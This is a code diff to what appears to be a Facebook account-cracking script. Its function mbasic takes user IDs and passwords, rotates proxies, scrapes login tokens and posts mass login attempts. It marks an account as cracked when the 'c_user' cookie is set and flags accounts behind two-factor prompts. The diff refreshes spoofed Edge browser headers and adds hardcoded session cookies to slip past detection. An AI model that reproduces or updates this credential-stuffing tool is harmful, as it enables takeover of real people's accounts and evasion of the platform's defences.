@@ -1256,34 +1256,65 @@ def mbasic(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
+            free_fb = Session.get('https://m.facebook.com/').text
             data ={
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '094112_Cux3',
+            'lgnjs': '1732383672',
             'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
+            'prefill_contact_point': '',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'password',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'true',
+            'ab_test_data': '/AAAAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAAAAAAA4/AHVAAAAABHAG',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            headers = {
-            'authority': 'www.facebook.com',
+            cookies = {
+            'ps_n': '1',
+            'ps_l': '1',
+            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
+            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
+            'wd': '1440x828',
+            'fr': '1Sh4kaqKnrag5qyxN.AWXyaHIvIqIcsvjkoMau4GoJse4.BmjDcj..AAA.0.0.BnQhO4.AWVw9EQg88w',
+            'sfau': 'AYgZEIOgDccNR569dRoUMeXbhHbCm0umeooUEYl-NCIUhjz7vt_Ox54y_nrjCJPp-KYqRpD1AQgsuTUn22N54tyX4HZe-dmOQMYyTCx2i3BBmcEhd26LTOgWuYSMMMvK7_jypQETy7xUJZDPY5i7i9oADYRrIJ0J5ZwC_4Ox1BA8Qhok8ZWrYKtX_Rdrayh6H1siX_oV5jeQpmgxCRpI8F92AlSeZRMdA7C190RRlIhZzhS4GlWyvZSYOOLGqPHIzhtNpmWvuMca8afviOeVYFw7nAYViNjHws1ndgOb_ExLmA',
+            'sfiu': 'AYgp9E58OWgYQu3Kal8KozrTjSuXSlWyZHTspQx7Cx8dSxYj_ZZrzF16rwv0tt5RgcLxulvbewEbl3jL-N-Xqf-dKVF9imq3SmBuPcRyuC-0jI2D3eAzxFO5K9ZxIbMSRFwt-OoBw2DxttrXLe-KeEAFRQXuIUK2ds4c67aVNJ5az_jA7yMXwdQKqcMu8BsaVV5dQbvo-lRO6_YUunjtw-QCEoJA7jNG3KTIGofWdJfaCssahuxSaC_iwMa1xBf5Q3OxKq1123tbB6RLSNVK1oKWk4Ch64ELKugVPZNyKJdMUw',}
+            headers ={
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
             'origin': 'https://www.facebook.com',
+            'priority': 'u=0, i',
             'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.63", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
+            'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092"
+            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1322,6 +1353,7 @@ def mbasic(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
+
 
 def p(uid,pwx,tl):
     global oks
